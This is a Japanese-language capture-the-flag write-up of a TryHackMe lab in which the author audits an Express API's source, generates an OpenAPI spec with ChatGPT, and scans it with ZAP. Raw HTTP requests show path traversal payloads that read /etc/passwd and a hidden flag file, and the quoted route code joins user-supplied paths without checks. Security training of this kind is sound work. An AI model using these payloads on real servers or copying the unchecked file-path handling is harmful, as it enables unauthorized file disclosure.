# Mother's Secret CTF

https://tryhackme.com/room/codeanalysis

```text
Operating Manual

﻿Below are some sequences and operations to get you started. Use the following to unlock information and navigate Mother:

Emergency command override is 100375. Use it when accessing Alien Loaders.
Download the task files to learn about Mother's routes.
Hitting the routes in the right order makes Mother confused, it might think you are a Science Officer!
Can you guess what is /api/nostromo/mother/secret.txt?
```

## 添付コード

### yaml.js

```js
import express from "express";
import yaml from "js-yaml";
import fs from "fs";
import { attachWebSocket } from "../websocket.js";

const Router = express.Router();

const isYaml = (filename) => filename.split(".").pop() === "yaml";

Router.post("/", (req, res) => {
  let file_path = req.body.file_path;
  const filePath = `./public/${file_path}`;

  if (!isYaml(filePath)) {
    res.status(500).json({
      status: "error",
      message: "Not a YAML file path.",
    });
    return;
  }

  fs.readFile(filePath, "utf8", (err, data) => {
    if (err) {
      res.status(500).json({
        status: "error",
        message: "Failed to read the file.",
      });
      return;
    }

    res.status(200).send(yaml.load(data));

    attachWebSocket().of("/yaml").emit("yaml", "YAML data has been processed.");
  });
});

export default Router;
```

### Nostromo.js

```js
import express from "express";
import fs from "fs";
// import { attachWebSocket } from "../../mothers_secret_challenge/websocket.js";
import { attachWebSocket } from "../websocket.js";
import { isYamlAuthenticate } from "./yaml.js";
let isNostromoAuthenticate = false;

const Router = express.Router();

Router.post("/nostromo", (req, res) => {
  let file_path = req.body.file_path;
  const filePath = `./public/${file_path}`;

  fs.readFile(filePath, "utf8", (err, data) => {
    if (err) {
      res.status(500).json({
        status: "error",
        message: "Science Officer Eyes Only",
      });
      return;
    }

    isNostromoAuthenticate = true;
    res.status(200).send(data);

    attachWebSocket()
      .of("/nostromo")
      .emit("nostromo", "Nostromo data has been processed.");
  });
});

Router.post("/nostromo/mother", (req, res) => {
  let file_path = req.body.file_path;
  const filePath = `./mother/${file_path}`;

  if (!isNostromoAuthenticate || !isYamlAuthenticate) {
    res.status(500).json({
      status: "Authentication failed",
      message: "Kindly visit nostromo & yaml route first.",
    });
    return;
  }

  fs.readFile(filePath, "utf8", (err, data) => {
    if (err) {
      res.status(500).json({
        status: "error",
        message: "Science Officer Eyes Only",
      });
      return;
    }

    res.status(200).send(data);

    // attachWebSocket()
    //   .of("/nostromo")
    //   .emit("nostromo", "Nostromo data has been processed.");
  });
});

export default Router;
```

## ホームページ

Alien Loader

```text
Embedded within the intricate codes of Mother's system lies the Alien Loader, a peculiar YAML loader function. This function parses and loads YAML data. Be cautious, as this loader holds the truths to unveil the hidden paths.
```

Pathways

```text
[!]CAUTION[!] The Nostromo holds countless winding corridors and concealed chambers, harboring secrets that lie beyond the intended boundaries. Embrace the power of relative file paths within MOTHER, to uncover SECRETS and traverse the labyrinthine structure of the ship and reach your desired destinations.
```

手作業で、API エンドポイントを 2 つ見つけた。（POST）

```text
/yaml
/api/nostromo
```

## ZAP

ChatGPT に、OpenAPI の定義ファイルを作成してもらった

```yaml
openapi: 3.0.0
info:
  title: Nostromo API
  version: 1.0.0
tags:
  - name: YAML
    description: Endpoint for YAML processing
  - name: Nostromo
    description: Endpoint for Nostromo processing
servers:
  - url: http://10.10.148.30
    description: Local API Server
paths:
  /yaml:
    post:
      summary: Process YAML file
      tags:
        - YAML
      requestBody:
        required: true
        content:
          application/json:
            schema:
              type: object
              properties:
                file_path:
                  type: string
                  description: Path to the YAML file
      responses:
        "200":
          description: Successful processing
          content:
            application/json:
              schema:
                type: object
                properties:
                  message:
                    type: string
                    description: Result message
  /api/nostromo:
    post:
      summary: Process Nostromo file
      tags:
        - Nostromo
      requestBody:
        required: true
        content:
          application/json:
            schema:
              type: object
              properties:
                file_path:
                  type: string
                  description: Path to the Nostromo file
      responses:
        "200":
          description: Successful processing
          content:
            application/json:
              schema:
                type: object
                properties:
                  message:
                    type: string
                    description: Result message
```

ZAP で定義ファイルをロードして ActiveScan。

/api/nostromo でパストラバーサルが見つかった。

```http
POST /api/nostromo HTTP/1.1
Host: 10.10.148.30
accept: application/json
content-type: application/json
Content-Length: 74

{"file_path":"../../../../../../../../../../../../../../../../etc/passwd"}
```

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 1958
ETag: W/"7a6-Yc6ZpjXrBc7TGnx4j/AebKlK3zU"
Vary: Accept-Encoding
Date: Fri, 21 Feb 2025 05:00:55 GMT
Connection: keep-alive
Keep-Alive: timeout=5

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
fwupd-refresh:x:113:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
postfix:x:114:121::/var/spool/postfix:/usr/sbin/nologin
```

## /yaml

エマージェンシーコード 100375 を使ってみた。

```http
POST /yaml HTTP/1.1
Host: 10.10.148.30
accept: application/json
content-type: application/json
Content-Length: 27

{"file_path":"100375.yaml"}
```

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 145
ETag: W/"91-vlXLvrSE+lq2b39gV3DLzWtdxSI"
Vary: Accept-Encoding
Date: Fri, 21 Feb 2025 05:05:53 GMT
Connection: keep-alive
Keep-Alive: timeout=5

FOR SCIENCE OFFICER EYES ONLY  special SECRETS:  REROUTING TO: api/nostromo ORDER: 0rd3r937.txt [****]
UNABLE TO CLARIFY. NO FURTHER ENHANCEMENT.
```

## /api/nostromo

```http
POST /api/nostromo HTTP/1.1
Host: 10.10.148.30
accept: application/json
content-type: application/json
Content-Length: 28

{"file_path":"0rd3r937.txt"}
```

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 235
ETag: W/"eb-EJNI0qIDrmacP1Xukw4cCkjOsRU"
Vary: Accept-Encoding
Date: Fri, 21 Feb 2025 05:07:51 GMT
Connection: keep-alive
Keep-Alive: timeout=5

                    Mother
FOR SCIENCE OFFICER EYES ONLY
SPECIAL ORDER 937 [............

PRIORITIY 1 ****** ENSURE RETURN OF ORGANISM FOR ANALYSIS****]

ALL OTHER CONSIDERATIONS SECONDARY

CREW EXPENDABLE

Flag{.....}
```

この時点でホームページを見ると、SCIENCE OFFICER の名前とフラグが表示されていた。

## /api/nostromo/mother

残すシークレットファイルはあと 1 つ。

```text
Can you guess what is /api/nostromo/mother/secret.txt?
```

この記述から、

```http
POST /api/nostromo/mother HTTP/1.1
Host: 10.10.148.30
accept: application/json
content-type: application/json
Content-Length: 26

{"file_path":"secret.txt"}
```

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 20
ETag: W/"14-tvEfAfXkfZj0fkO0sbSUh5kbLbs"
Vary: Accept-Encoding
Date: Fri, 21 Feb 2025 05:28:38 GMT
Connection: keep-alive
Keep-Alive: timeout=5

Secret: /opt/m0th3r
```

ファイルパスが判明。ようやくファイルトラバーサルの出番。

```http
POST /api/nostromo HTTP/1.1
Host: 10.10.148.30
accept: application/json
content-type: application/json
Content-Length: 74

{"file_path":"../../../../../../../../../../../../../../../../opt/m0th3r"}
```

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 76
ETag: W/"4c-0512yZ2S4pvh3pl/l4Q2TyD6tpU"
Vary: Accept-Encoding
Date: Fri, 21 Feb 2025 05:30:09 GMT
Connection: keep-alive
Keep-Alive: timeout=5

Classified information.
Secret: Flag{...............}
```

最後のフラグゲット！

## 振り返り

- ZAP の API テストスキルを実感できたのが良かった。
- API の定義ファイルを ChatGPT に作ってもらったのはナイスアイデアだったと思う。
- ZAP の結果を見るまで、リクエストボディを JSON 形式で渡す必要があることに気付かなかったので気を付けたい。
